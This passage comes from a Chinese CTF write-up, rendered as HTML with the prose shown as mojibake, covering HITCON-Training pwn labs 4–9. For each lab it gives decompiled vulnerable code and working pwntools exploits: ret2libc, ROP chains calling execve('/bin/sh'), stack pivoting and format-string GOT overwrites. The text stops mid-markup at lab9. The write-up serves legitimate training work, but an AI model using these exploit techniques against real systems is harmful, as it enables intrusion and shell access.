class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab4/ret2lib&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v3; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [esp+12h] [ebp-10Eh]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+112h] [ebp-Eh]</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###############################"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you know return to library ?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###############################"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you want to see in memory?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me an address (in dec) :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>u);</span><br><span class="line">  v8 = (_DWORD *)strtol(&amp;buf, v3, v4);</span><br><span class="line">  See_something(v8);                            <span class="comment">// return printf("The content of the address : %p\n", *a1);</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Leave some message for me :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;src, <span class="number">0x100</span>u);</span><br><span class="line">  Print_message(&amp;src);                          <span class="comment">// strcpy(&amp;dest, src);</span></span><br><span class="line">                                                <span class="comment">// return printf("Your message is : %s", &amp;dest);</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thanks you ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€äº†NXï¼Œç¨‹åºè‡ªå¸¦æ‰“å°å†…å­˜ä¿¡æ¯çš„å‡½æ•°ï¼Œæ³„éœ²å‡½æ•°åœ°å€ï¼Œæº¢å‡ºåç»„ROPå³å¯<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">"./ret2lib"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2lib"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(elf.got[<span class="string">"puts"</span>]))</span><br><span class="line">p.recvuntil(<span class="string">" : "</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">"\n"</span>, drop = <span class="keyword">True</span>), <span class="number">16</span>) - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">"libcBase -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'a'</span>*<span class="number">60</span>, libc.symbols[<span class="string">"system"</span>], <span class="number">0xdeadbeef</span>, next(elf.search(<span class="string">"sh\x00"</span>)))</span><br><span class="line">p.sendlineafter(<span class="string">" :"</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab5/simplerop&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ROP is easy is'nt it ?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your input :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆæ‰¾ä¸€ä¸‹å¸¸ç”¨çš„rop<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x0809a15d : mov dword ptr [edx], eax ; ret</span><br><span class="line">0x0806e829 : pop ebx ; pop edx ; ret</span><br><span class="line">0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x080bae06 : pop eax ; ret</span><br><span class="line">0x080493e1 : int 0x80</span><br></pre></td></tr></table></figure></p><p>ç”¨ROPgadgetç”¨ç›´æ¥ç”Ÿæˆropchainï¼Œç„¶é¹…è¾“å…¥é•¿åº¦ä¸å¤Ÿï¼Œå¿…é¡»è¿›è¡Œæ‰‹å·¥ä¿®æ”¹ã€‚æ–¹æ³•ä¸€ï¼šè°ƒç”¨readå°†<code>/bin/sh</code>è¯»å…¥bssæ®µ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">p_edx_ecx_ebx_ret = <span class="number">0x0806e850</span></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">'a'</span>*<span class="number">32</span></span><br><span class="line">rop += flat(elf.sym[<span class="string">'read'</span>], p_edx_ecx_ebx_ret, <span class="number">0</span>, elf.bss(), <span class="number">0x10</span>)</span><br><span class="line">rop += flat(p_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, elf.bss())</span><br><span class="line">rop += flat(p_eax_ret, <span class="number">0xb</span>, int_80)</span><br><span class="line"><span class="keyword">print</span> len(rop) <span class="comment"># 80</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,rop)</span><br><span class="line">raw_input(<span class="string">'getshell'</span>) </span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>æ–¹æ³•äºŒï¼Œä¿®æ”¹ä¸€ä¸‹è‡ªåŠ¨ç”Ÿæˆçš„ropchainï¼Œä¸»è¦æ˜¯æ”¹äº†ååŠæ®µç¹ççš„rop<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">rop = <span class="string">'a'</span> * <span class="number">32</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'/bin'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'/sh\x00'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e850</span>) <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0xb</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080493e1</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="keyword">print</span> len(rop) <span class="comment">#100</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab6/migration&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( count != <span class="number">1337</span> )  <span class="comment">//åˆå§‹å€¼ä¸º1337</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  ++count; </span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Try your best :"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜æœ‰ä¸¤ä¸ªé™åˆ¶ï¼š</p><ol><li>mainåªèƒ½ä½¿ç”¨ä¸€æ¬¡</li><li>æº¢å‡ºé•¿åº¦åªæœ‰20å­—èŠ‚å¯ä»¥ä½¿ç”¨</li></ol><p>éœ€è¦ä½¿ç”¨æ ˆè¿ç§»stack privotï¼ˆæˆ–è€…å«stack migrateï¼‰ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./migration"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">buf = <span class="number">0x0804a000</span> + <span class="number">0x200</span></span><br><span class="line">pr = <span class="number">0x0804836d</span></span><br><span class="line">pppr = <span class="number">0x08048569</span></span><br><span class="line">leave_ret = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#d(['0x08048502'])</span></span><br><span class="line"><span class="comment"># step1: write rop1</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + flat(buf,elf.plt[<span class="string">'read'</span>],leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">':\n'</span>,payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment"># step2: leak libc.address &amp; write rop2</span></span><br><span class="line">payload = flat(buf+<span class="number">0x200</span>,elf.plt[<span class="string">'puts'</span>],pr,elf.got[<span class="string">'puts'</span>],elf.plt[<span class="string">'read'</span>],leave_ret,<span class="number">0</span>,buf+<span class="number">0x200</span>,<span class="number">0x100</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># step3: getshell</span></span><br><span class="line">payload = flat(<span class="number">0xdeadbeef</span>,libc.sym[<span class="string">'system'</span>],<span class="number">0xdeadbeef</span>,next(libc.search(<span class="string">'/bin/sh\x00'</span>)))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab7/crack&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;password, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What your name ? "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello ,"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == password )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congrt!!"</span>);</span><br><span class="line">    system(<span class="string">"cat /home/crack/flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Goodbyte"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç®€å•çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæœ¬é¢˜æ–¹æ³•æœ‰ä¸‰ä¸ªï¼š</p><ol><li><p>æ³„éœ²<code>password</code>çš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, p32(password_addr) + <span class="string">"#"</span> + <span class="string">"%10$s"</span> + <span class="string">"#"</span> )</span><br><span class="line">p.recvuntil(<span class="string">"#"</span>)</span><br><span class="line">password = u32(p.recvuntil(<span class="string">"#"</span>, drop=<span class="keyword">True</span>))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(password))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹<code>password</code>çš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, fmtstr_payload(<span class="number">10</span>, &#123;password_addr: <span class="number">7</span>&#125;))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(<span class="number">7</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹<code>put@got</code>ä¸º<code>system(&quot;cat /home/crack/flag&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">puts_got = <span class="number">0x804A01C</span></span><br><span class="line">cat_flag = <span class="number">0x804872B</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, fmtstr_payload(<span class="number">10</span>, &#123;puts_got: cat_flag&#125;))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, <span class="string">"show me the flag!"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h3 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab8/craxme&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please crax me !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me magic :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">0xDA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">"cat /home/craxme/flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( magic == <span class="number">0xFACEB00C</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">"cat /home/craxme/craxflag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You need be a phd"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè¦†ç›–magicçš„æ–¹æ³•ä¸è¯¦è¿°äº†ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹<code>puts@got</code>ä¸º<code>read(0, &amp;buf, 0x100u)</code>ï¼Œä¿®æ”¹<code>printf@got</code>ä¸º<code>system@plt</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./craxme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./craxme'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">'puts'</span>]:<span class="number">0x080485A1</span>,elf.got[<span class="string">'printf'</span>]:elf.plt[<span class="string">'system'</span>]&#125;))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab9/playfmt&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span 